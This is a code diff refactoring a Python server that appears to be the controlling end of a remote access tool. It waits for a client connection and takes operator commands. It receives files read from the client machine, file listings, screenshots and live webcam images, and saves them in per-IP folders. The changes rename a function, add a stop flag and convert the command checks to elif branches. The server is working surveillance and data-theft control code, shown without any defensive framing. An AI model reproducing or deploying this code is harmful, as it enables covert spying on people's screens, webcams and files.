@@ -16,6 +16,7 @@ LOG_FILE_DIR = 'logs/{ip}/{date}'
 last_client_socket = None
 stop = False
 
+
 # Function to parse the arguments
 def args_parse(command_line=None):
     parser = argparse.ArgumentParser(description='Server of file receiver')
@@ -33,7 +34,7 @@ def args_parse(command_line=None):
 
 
 # Function to set up the server
-def setup_server(host, port):
+def create_server_socket(host, port):
     server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server_socket.bind((host, port))
     server_socket.listen(1)
@@ -41,7 +42,8 @@ def setup_server(host, port):
 
 
 def command_handler_loop(server_socket):
-    while True:
+    global stop
+    while not stop:
         try:
             command_line = input("Server > ")
             args = args_parse(command_line.split())
@@ -57,11 +59,10 @@ def command_handler_loop(server_socket):
             elif args.capture:
                 receive_webcam_live()
         except SystemExit:
-            print("\n")
             pass
         except Exception as e:
-            print(f"An error occurred: {e}")
-            print("Please try again.")
+            print(f"Error: {e}")
+            continue
 
 
 def show_files():
@@ -149,7 +150,7 @@ def kill_client():
 # Function to handle the client
 def handle_client(client_socket, client_address):
     global stop
-    while True:
+    while not stop:
         try:
             data = b""
             while True:
@@ -183,7 +184,7 @@ def handle_client(client_socket, client_address):
                     with open(dir_name + '/' + filename, 'wb') as f:
                         f.write(file_content_bytes)
 
-                if data_command == 'READ':
+                elif data_command == 'READ':
                     global READ_FILE_DIR
                     filename = client_info['filename']
                     file_content = client_info['file_content']
@@ -197,11 +198,11 @@ def handle_client(client_socket, client_address):
                         f.write(file_content_bytes)
                         print(f"File {filename} saved to {dir_name}")
 
-                if data_command == 'SHOW':
+                elif data_command == 'SHOW':
                     files = client_info['files']
                     print(f"Files from client: {files}")
 
-                if data_command == 'SCREENSHOT':
+                elif data_command == 'SCREENSHOT':
                     global SCREENSHOT_DIR
                     screenshot = client_info['screenshot']
                     screenshot_bytes = base64.b64decode(screenshot)
@@ -215,7 +216,7 @@ def handle_client(client_socket, client_address):
                         f.write(screenshot_bytes)
                         print(f"Screenshot saved to {dir_name}")
 
-                if data_command == 'WEBCAM':
+                elif data_command == 'WEBCAM':
                     image_encoded = client_info['image']
                     image_bytes = base64.b64decode(image_encoded)
                     image = cv2.imdecode(np.frombuffer(image_bytes, np.uint8), cv2.IMREAD_COLOR)
@@ -226,13 +227,13 @@ def handle_client(client_socket, client_address):
                     if cv2.waitKey(1) & 0xFF == ord('q'):
                         break
 
-                if data_command == 'KILL':
+                elif data_command == 'KILL':
                     stop = client_info['stop']
                     if stop:
                         print("Killing server...")
                         os._exit(0)
 
-                if data_command == 'ERROR':
+                elif data_command == 'ERROR':
                     error = client_info['error']
                     print(f"Error from client: {error}")
 
@@ -248,8 +249,8 @@ def handle_client(client_socket, client_address):
 
 
 def accept_connections(server_socket):
-    global last_client_socket
-    while True:
+    global last_client_socket, stop
+    while not stop:
         client_socket, client_address = server_socket.accept()
         last_client_socket = client_socket
         print(f"Connection with {client_address} established")
@@ -261,10 +262,10 @@ def main():
     args = args_parse()
     host = 'localhost'
     port = args.listen
-    server_socket = setup_server(host, port)
-
-    threading.Thread(target=accept_connections, args=(server_socket,)).start()
-    threading.Thread(target=command_handler_loop, args=(server_socket,)).start()
+    server_socket = create_server_socket(host, port)
+    accept_thread = threading.Thread(target=accept_connections, args=(server_socket,))
+    accept_thread.start()
+    command_handler_loop(server_socket)
 
 
 if __name__ == '__main__':
